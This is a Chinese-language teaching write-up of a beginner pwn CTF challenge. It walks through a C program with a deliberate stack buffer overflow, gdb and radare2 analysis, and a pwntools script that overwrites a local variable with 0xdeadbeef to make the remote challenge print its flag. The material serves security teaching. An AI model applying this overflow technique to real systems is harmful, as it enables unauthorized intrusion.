# pwn CTF解題
```
底下以範例說明pwn CTF解題的大致過程
部分未顯示清楚的部分請講師補充
```
```
Level 1  1-1.pass
題目敘述
Billy 想起他的鑰匙了，但他還是想進到房間裡確認

你可以幫他打開門嗎？

nc 120.114.62.203 6125

附件：pass、pass.c
```
# 先檢查下載的原始檔
```
通常PWN CTF不會提供原始檔
為使教學更加簡單 特別放上原始檔
```
```
#include"stdio.h"
#include"stdlib.h"

void printTheKey(){
  /*
   *
   * print the key
   *
   */
}

int main(){
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  
  int token = 1234; <===存在buffer <==>  stack
  char key[16];   <=== 可以放16個字元

  printf("Billy left his key in the locked room.\n");
  printf("However, he forgot the token of the room.\n");
  printf("Do you know what's the key?");

  read(0, key, 40); ==> 可以輸入40個字元 超過key[16] ==> 可以buffer overflow
  

  if((int)token == 0xdeadbeef){ # 如果token滿足此條件就可以印出flag
    printf("Door open. OwO\n");
    printTheKey();
    system("cat /home/ctf/flag"); ==> 印出你要的flag
  }else{ 
    printf("Cannot open door. QwQ\n");
  }

  return 0;
}
```
```
關鍵點: 把存放token的位址找出來(用逆向工具) 
        將buffer 覆蓋 一直到token的位址 
        再把正確的0xdeadbeef 塞進token 
        完成正確的滿足條件 ==> 就可以列印出flag
```
# 初步探索執行畫面
## 執行一下程式看看程式行為
```
./pass
Billy left his key in the locked room.
However, he forgot the token of the room.
Do you know what's the key?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Cannot open door. QwQ
```
## 基本檢查 ==>沒有看到特別的結果
```
file pass

srings pass
```
# 使用gdb檢查與測試[底下畫面已安裝peda] ==>展示一下基本用法 
```
root@kali:~# cd Downloads/

root@kali:~/Downloads# gdb
GNU gdb (Debian 8.2.1-2) 8.2.1
-----------------------------
For help, type "help".
Type "apropos word" to search for commands related to "word".

gdb-peda$ file pass <==載入下再的檔案
Reading symbols from pass...(no debugging symbols found)...done.

gdb-peda$ disas main  <====
Dump of assembler code for function main:
   0x000000000040080e <+0>:	push   rbp
   0x000000000040080f <+1>:	mov    rbp,rsp
   0x0000000000400812 <+4>:	sub    rsp,0x20
   0x0000000000400816 <+8>:	mov    rax,QWORD PTR [rip+0x200843]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x000000000040081d <+15>:	mov    ecx,0x0
   0x0000000000400822 <+20>:	mov    edx,0x2
   0x0000000000400827 <+25>:	mov    esi,0x0
   0x000000000040082c <+30>:	mov    rdi,rax
   0x000000000040082f <+33>:	call   0x4005b0 <setvbuf@plt>
   0x0000000000400834 <+38>:	mov    rax,QWORD PTR [rip+0x200835]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x000000000040083b <+45>:	mov    ecx,0x0
   0x0000000000400840 <+50>:	mov    edx,0x2
   0x0000000000400845 <+55>:	mov    esi,0x0
   0x000000000040084a <+60>:	mov    rdi,rax
   0x000000000040084d <+63>:	call   0x4005b0 <setvbuf@plt>
   0x0000000000400852 <+68>:	mov    DWORD PTR [rbp-0x4],0x4d2
   0x0000000000400859 <+75>:	mov    edi,0x400978
   0x000000000040085e <+80>:	call   0x400560 <puts@plt>
   0x0000000000400863 <+85>:	mov    edi,0x4009a0
   0x0000000000400868 <+90>:	call   0x400560 <puts@plt>
   0x000000000040086d <+95>:	mov    edi,0x4009ca
   0x0000000000400872 <+100>:	mov    eax,0x0
   0x0000000000400877 <+105>:	call   0x400580 <printf@plt>
   0x000000000040087c <+110>:	lea    rax,[rbp-0x20]
   0x0000000000400880 <+114>:	mov    edx,0x28      <====== 0x28 ==40    read(0, key, 40)
   0x0000000000400885 <+119>:	mov    rsi,rax
   0x0000000000400888 <+122>:	mov    edi,0x0
   0x000000000040088d <+127>:	mov    eax,0x0
   0x0000000000400892 <+132>:	call   0x400590 <read@plt>   <====== 呼叫 read()
   0x0000000000400897 <+137>:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef <====== 比較token 會不會等於0xdeadbeef
   0x000000000040089e <+144>:	jne    0x4008c0 <main+178>   
          <=====https://www.aldeid.com/wiki/X86-assembly/Instructions/jnz#:~:text=3.2%20Example%202-,Description,found%20after%20a%20cmp%20instruction.
   0x00000000004008a0 <+146>:	mov    edi,0x4009e6
   0x00000000004008a5 <+151>:	call   0x400560 <puts@plt>  <======你要的 printf("Door open. OwO\n");
   0x00000000004008aa <+156>:	mov    eax,0x0
   0x00000000004008af <+161>:	call   0x4006c6 <printTheKey> <======你要的 printTheKey();
   0x00000000004008b4 <+166>:	mov    edi,0x4009f5
   0x00000000004008b9 <+171>:	call   0x400570 <system@plt> <======你要的 system("cat /home/ctf/flag"); 
   0x00000000004008be <+176>:	jmp    0x4008ca <main+188>
   0x00000000004008c0 <+178>:	mov    edi,0x400a08
   0x00000000004008c5 <+183>:	call   0x400560 <puts@plt>
   0x00000000004008ca <+188>:	mov    eax,0x0
   0x00000000004008cf <+193>:	leave  
   0x00000000004008d0 <+194>:	ret    
End of assembler dump.


db-peda$ 
Dump of assembler code for function main:
   0x000000000040080e <+0>:	push   rbp
   0x000000000040080f <+1>:	mov    rbp,rsp
   0x0000000000400812 <+4>:	sub    rsp,0x20
   0x0000000000400816 <+8>:	mov    rax,QWORD PTR [rip+0x200843]        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x000000000040081d <+15>:	mov    ecx,0x0
   0x0000000000400822 <+20>:	mov    edx,0x2
   0x0000000000400827 <+25>:	mov    esi,0x0
   0x000000000040082c <+30>:	mov    rdi,rax
   0x000000000040082f <+33>:	call   0x4005b0 <setvbuf@plt>
   0x0000000000400834 <+38>:	mov    rax,QWORD PTR [rip+0x200835]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x000000000040083b <+45>:	mov    ecx,0x0
   0x0000000000400840 <+50>:	mov    edx,0x2
   0x0000000000400845 <+55>:	mov    esi,0x0
   0x000000000040084a <+60>:	mov    rdi,rax
   0x000000000040084d <+63>:	call   0x4005b0 <setvbuf@plt>
   0x0000000000400852 <+68>:	mov    DWORD PTR [rbp-0x4],0x4d2
   0x0000000000400859 <+75>:	mov    edi,0x400978
   0x000000000040085e <+80>:	call   0x400560 <puts@plt>
   0x0000000000400863 <+85>:	mov    edi,0x4009a0
   0x0000000000400868 <+90>:	call   0x400560 <puts@plt>
   0x000000000040086d <+95>:	mov    edi,0x4009ca
   0x0000000000400872 <+100>:	mov    eax,0x0
   0x0000000000400877 <+105>:	call   0x400580 <printf@plt>
   0x000000000040087c <+110>:	lea    rax,[rbp-0x20]
   0x0000000000400880 <+114>:	mov    edx,0x28
   0x0000000000400885 <+119>:	mov    rsi,rax
   0x0000000000400888 <+122>:	mov    edi,0x0
   0x000000000040088d <+127>:	mov    eax,0x0
   0x0000000000400892 <+132>:	call   0x400590 <read@plt>
   0x0000000000400897 <+137>:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef
   0x000000000040089e <+144>:	jne    0x4008c0 <main+178>
   0x00000000004008a0 <+146>:	mov    edi,0x4009e6
   0x00000000004008a5 <+151>:	call   0x400560 <puts@plt>
   0x00000000004008aa <+156>:	mov    eax,0x0
   0x00000000004008af <+161>:	call   0x4006c6 <printTheKey>
   0x00000000004008b4 <+166>:	mov    edi,0x4009f5
   0x00000000004008b9 <+171>:	call   0x400570 <system@plt>
   0x00000000004008be <+176>:	jmp    0x4008ca <main+188>
   0x00000000004008c0 <+178>:	mov    edi,0x400a08
   0x00000000004008c5 <+183>:	call   0x400560 <puts@plt>
   0x00000000004008ca <+188>:	mov    eax,0x0
   0x00000000004008cf <+193>:	leave  
   0x00000000004008d0 <+194>:	ret    
End of assembler dump.
gdb-peda$ b *0x00000000004008b9 
Breakpoint 1 at 0x4008b9

# 再胡亂式看看
checksec

vmmap

# 最後執行到底
gdb-peda$ r
Starting program: /root/Downloads/pass 
Billy left his key in the locked room.
However, he forgot the token of the room.
Do you know what's the key?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Cannot open door. QwQ
```
# 比較耗找到關鍵的 radare2 逆向
```
r2 pass
[0x004005d0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x004005d0]> afl
0x00400528    3 26           sym._init
0x00400560    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.system
0x00400580    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x004005a0    1 6            sym.imp.__libc_start_main
0x004005b0    1 6            sym.imp.setvbuf
0x004005c0    1 6            fcn.004005c0
0x004005d0    1 41           entry0
0x00400600    4 50   -> 41   sym.deregister_tm_clones
0x00400640    4 58   -> 55   sym.register_tm_clones
0x00400680    3 28           sym.__do_global_dtors_aux
0x004006a0    4 38   -> 35   entry.init0
0x004006c6    7 328          sym.printTheKey
0x0040080e    4 195          main
0x004008e0    4 101          sym.__libc_csu_init
0x00400950    1 2            sym.__libc_csu_fini
0x00400954    1 9            sym._fini

s main

VV 
即可找出關鍵的位址
```

# 完整程式
```
# nc 120.114.62.213 6125
# 1.載入pwntools
from pwn import *

# 2.建立遠端連線
#r = process('./pass')
r = remote('120.114.62.213', 6125)

# 3.建立攻擊的shell code 或payload
payload = b'A'*28 <===================== 重點是  payload:要蓋多少  如何計算!!
r.sendline(payload + p32(0xdeadbeef))   <==== 讓token的值變成p(0xdeadbeef)
                                        <==== 讓token(位址)的值變成(覆寫入)p64(0xdeadbeef)

# 4.建立互動式shell
r.interactive()
```
